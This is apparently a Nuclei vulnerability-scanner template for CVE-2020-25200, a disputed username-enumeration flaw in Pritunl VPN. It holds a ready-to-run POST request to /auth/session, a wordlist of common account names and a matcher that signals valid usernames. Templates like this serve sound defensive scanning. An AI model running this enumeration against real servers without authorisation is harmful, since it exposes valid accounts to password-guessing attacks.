id: CVE-2020-25200

info:
  name: Pritunl 1.29.2145.25 Error Message /auth/session - Username Information Disclosure
  author: 0xpugazh
  severity: medium
  description: |
    Pritunl 1.29.2145.25 allows attackers to enumerate valid VPN usernames via a series of /auth/session login attempts. Initially, the server will return error 401. However, if the username is valid, then after 20 login attempts, the server will start responding with error 400. Invalid usernames will receive error 401 indefinitely. Note: This has been disputed by the vendor as not a vulnerability. They argue that this is an intended design
  reference:
    - https://github.com/lukaszstu/pritunl-CVE-2020-25200/blob/master/CVE-2020-25200
    - https://nvd.nist.gov/vuln/detail/CVE-2020-25200
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
    cvss-score: 5.3
    cve-id: CVE-2020-25200
    cwe-id: CWE-203
    epss-score: 0.00164
    epss-percentile: 0.53034
    cpe: cpe:2.3:a:pritunl:pritunl:1.29.2145.25:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: pritunl
    product: pritunl
    publicwww-query: title:"Pritunl"
  tags: cve,cve2020,user-enum,pritnul,vpn

http:
  - method: POST
    path:
      - "{{BaseURL}}/auth/session"
    headers:
      Content-Type: application/json
    body: |
      {"username":"{{usernames}}","password":"randompass"}

    payloads:
      usernames:
        - root
        - admin
        - test
        - guest
        - info
        - adm
        - mysql
        - user
        - administrator
        - oracle
        - ftp
        - pi
        - puppet
        - ansible
        - ec2-user
        - vagrant
        - azureuser
        - carlos
        - root
        - admin
        - test
        - guest
        - info
        - adm
        - mysql
        - user
        - administrator
        - oracle
        - ftp
        - puppet
        - ansible
        - ec2-user
        - vagrant
        - azureuser
        - access
        - accounting
        - accounts
        - administracion
        - administrador
        - administrator
        - administrators
        - admins
        - ads
        - adserver
        - adsl
        - affiliate
        - affiliates
        - afiliados
        - agent
        - akamai
        - alerts
        - alpha
        - alterwind
        - analyzer
        - antivirus
        - apache
        - apollo
        - app
        - app01
        - app1
        - apple
        - application
        - applications
        - apps
        - appserver
        - atlas
        - att
        - auth
        - auto
        - autodiscover

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "Too many authentication attempts"

      - type: status
        status:
          - 400
